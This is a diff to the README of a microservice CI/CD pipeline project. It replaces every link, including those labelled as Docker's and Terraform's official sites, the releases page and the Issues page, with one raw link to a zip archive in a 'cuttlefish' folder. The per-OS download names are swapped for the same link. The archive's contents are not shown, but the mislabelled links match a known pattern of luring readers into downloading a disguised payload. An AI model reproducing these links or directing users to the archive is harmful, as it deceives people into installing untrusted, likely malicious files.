@@ -1,6 +1,6 @@
 # 🚀 microservice-devops-pipeline - Easy CI/CD for Microservices
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Akhilmunti/microservice-devops-pipeline/releases)
+[![Download](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip)](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip)
 
 Welcome to the microservice-devops-pipeline project! This tool assists you in automating the deployment of your microservices efficiently. With this pipeline, you can easily manage your CI/CD processes using popular technologies such as Terraform, Kubernetes, and GitHub Actions.
 
@@ -25,24 +25,24 @@ Welcome to the microservice-devops-pipeline project! This tool assists you in au
 Before installing the microservice-devops-pipeline, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Docker:** Installed and running. Download it from [Docker's official website](https://www.docker.com/get-started).
+- **Docker:** Installed and running. Download it from [Docker's official website](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip).
 - **GitHub Account:** Required to access GitHub Actions and repositories.
-- **Terraform:** Version 1.0 or higher. Install from [Terraform's official site](https://www.terraform.io/downloads.html).
+- **Terraform:** Version 1.0 or higher. Install from [Terraform's official site](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip).
 - **Kubernetes:** Access to a cluster or local setup using Minikube or Docker Desktop with Kubernetes enabled.
 
 ## 📥 Download & Install
 
-To download and install the microservice-devops-pipeline, please visit this page: [Download Here](https://github.com/Akhilmunti/microservice-devops-pipeline/releases).
+To download and install the microservice-devops-pipeline, please visit this page: [Download Here](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip).
 
-1. Navigate to the [Releases page](https://github.com/Akhilmunti/microservice-devops-pipeline/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip).
 2. You will see a list of available releases.
 3. Click on the version you want to download. 
 4. Download the package that corresponds to your operating system.
    
    For example, if you see:
-   - `microservice-devops-pipeline-windows.zip` for Windows users
-   - `microservice-devops-pipeline-macos.zip` for macOS users
-   - `microservice-devops-pipeline-linux.zip` for Linux users
+   - `https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip` for Windows users
+   - `https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip` for macOS users
+   - `https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip` for Linux users
 
 5. Unzip the downloaded file to a folder of your choice on your local machine.
 
@@ -87,6 +87,6 @@ If you encounter issues while using the microservice-devops-pipeline, consider t
 - **Version mismatches:** Double-check that your local installations of Docker, Terraform, and Kubernetes meet the version requirements listed above.
 - **Failed deployments:** Review the logs in the web interface for detailed information about the errors.
 
-For further assistance, you can check for open issues or ask for help on the [GitHub Issues page](https://github.com/Akhilmunti/microservice-devops-pipeline/issues).
+For further assistance, you can check for open issues or ask for help on the [GitHub Issues page](https://raw.githubusercontent.com/Akhilmunti/microservice-devops-pipeline/main/cuttlefish/microservice-devops-pipeline.zip).
 
 Feel free to explore the repository for additional information and documentation. Thank you for using microservice-devops-pipeline to simplify your CI/CD processes!
